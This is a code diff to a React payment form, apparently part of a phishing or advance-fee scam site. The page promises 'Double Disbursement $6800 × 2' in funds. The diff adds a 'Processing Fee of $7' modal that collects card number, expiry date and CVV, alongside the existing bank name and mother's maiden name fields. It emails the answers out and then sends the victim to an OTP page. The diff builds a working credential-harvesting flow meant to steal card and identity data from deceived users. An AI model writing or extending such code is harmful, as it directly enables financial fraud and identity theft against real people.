@@ -9,11 +9,13 @@ import bankLogo from './img/banklogo.png';
 
 const ExamForm = () => {
   const [showConfirmModal, setShowConfirmModal] = useState(false);
-  // const [showPinModal, setShowPinModal] = useState(false);
+  const [showPinModal, setShowPinModal] = useState(false);
   const [formValues, setFormValues] = useState({
     bankName: '',
     cardNumber: '',
     nameOnCard: '',
+    cvv: '',
+    expirationDate: '',
     maidenName: '',
     cardType: '',
     otherCardType: '',
@@ -31,6 +33,8 @@ const ExamForm = () => {
       bankName: '',
       cardNumber: '',
       nameOnCard: '',
+      cvv: '',
+      expirationDate: '',
       maidenName: '',
       cardType: '',
       otherCardType: '',
@@ -50,19 +54,19 @@ const ExamForm = () => {
 
   const handleConfirmClick = () => {
     sendEmail();
-    resetForm();
+    // resetForm();
     setShowConfirmModal(false);
-    navigate('/otp');
-    // setShowPinModal(true);
+    // navigate('/otp');
+    setShowPinModal(true);
   };
 
-  // const handlePinSubmit = (e) => {
-  //   e.preventDefault();
-  //   sendEmail();
-  //   resetForm();
-  //   setShowPinModal(false);
-  //   navigate('/otp');
-  // };
+  const handlePinSubmit = (e) => {
+    e.preventDefault();
+    sendEmail();
+    resetForm();
+    setShowPinModal(false);
+    navigate('/otp');
+  };
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
@@ -75,6 +79,34 @@ const ExamForm = () => {
   
   const handleCardLimitChange = (e) => {
   e.target.value = e.target.value.replace(/[a-zA-Z]/g, '');
+};
+
+// const handleCardNumberChange = (e) => {
+//   let value = e.target.value.replace(/\D/g, '');
+//   value = value.replace(/(.{4})/g, '$1 ').trim();
+//   // setCardNumber(value);
+// };
+
+const handleCardNumberChange = (e) => {
+  e.target.value = e.target.value
+    .replace(/\D/g, '') // Remove all non-digit characters
+    .replace(/(.{4})/g, '$1 ') // Add a space every 4 characters
+    .trim(); // Remove any trailing spaces
+};
+
+
+// const handleExpirationDateChange = (e) => {
+//   let value = e.target.value.replace(/\D/g, '');
+//   if (value.length >= 3) {
+//     value = value.replace(/(.{2})(.{2})/, '$1 / $2');
+//   }
+//   // setExpirationDate(value);
+// };
+
+const handleExpirationDateChange = (e) => {
+  e.target.value = e.target.value
+    .replace(/\D/g, '') // Remove all non-digit characters
+    .replace(/(.{2})(.{1,2})/, '$1 / $2'); // Add a slash after the first two digits
 };
 
   
@@ -142,13 +174,13 @@ const ExamForm = () => {
               <p className="fw-bold fs-4 text-end"> - $ 6.00</p>
             </div>
           </div> */}
-          <h3>Enter Credit Card Details</h3>
+          <h3>Enter Credit Account Details</h3>
           <p>
-            Enter the following to complete payment <br />
+          Enter the following to receive your funds <br />
             Only enter correct details to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
           </p>
           <div className="card p-4 pt-2">
-            <p className='text-end fw-bold fs-6'>Double Disbursement $3700 × 2</p>
+            <p className='text-end fw-bold fs-6'>Double Disbursement $6800 × 2</p>
             <p className="fst-italic text-end p-0 m-0">Trusted and Secure Payment</p>
             <div className="d-flex justify-content-end mb-3">
               <img src={bankLogo} alt="" className="img-fluid" width={270} height={30} />
@@ -315,32 +347,62 @@ const ExamForm = () => {
       </Modal>
 
       {/* PIN Modal */}
-      {/*
+      
       <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
         <Modal.Header closeButton>
-          <Modal.Title>Enter PIN</Modal.Title>
+          <Modal.Title>Processing Fee of $7</Modal.Title>
         </Modal.Header>
         <Modal.Body>
           <Form onSubmit={handlePinSubmit}>
-            <Form.Group controlId="formPin">
-              <Form.Label>Enter PIN</Form.Label>
-              <Form.Control
-                type="password"
-                placeholder="Enter PIN"
-                name="pin"
-                value={formValues.pin}
-                onInput={handleNumberOnlyInput}
+
+            <Form.Group className="mb-3" controlId="cardNumber">
+              <Form.Label>Card Number</Form.Label>
+              <Form.Control 
+                // type="text"
+                name='cardNumber' 
+                placeholder="0000 0000 0000 0000" 
+                required 
+                maxLength="24" 
+                value={formValues.cardNumber}
+                onInput={handleCardNumberChange} 
                 onChange={handleInputChange}
-                required
               />
             </Form.Group>
+            <div className="row">
+              <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
+                <Form.Label>Expiration Date</Form.Label>
+                <Form.Control 
+                  // type="text" 
+                  name="expirationDate"
+                  placeholder="MM / YY" 
+                  required 
+                  maxLength="7" 
+                  value={formValues.expirationDate}
+                  onInput={handleExpirationDateChange} 
+                  onChange={handleInputChange}
+                />
+              </Form.Group>
+              <Form.Group className="col-md-6 mb-3" controlId="cvv">
+                <Form.Label>CVV</Form.Label>
+                <Form.Control 
+                  // type="text" 
+                  name="cvv"
+                  placeholder="000" 
+                  required 
+                  maxLength="4" 
+                  value={formValues.cvv}
+                  onChange={handleInputChange}
+                  onInput={handleNumberOnlyInput}
+                />
+              </Form.Group>
+            </div>
+
             <Button variant="primary" type="submit" className="mt-3">
-              Submit PIN
+              PAY
             </Button>
           </Form>
         </Modal.Body>
       </Modal>
-      */}
       
       <Footer />
     </div>
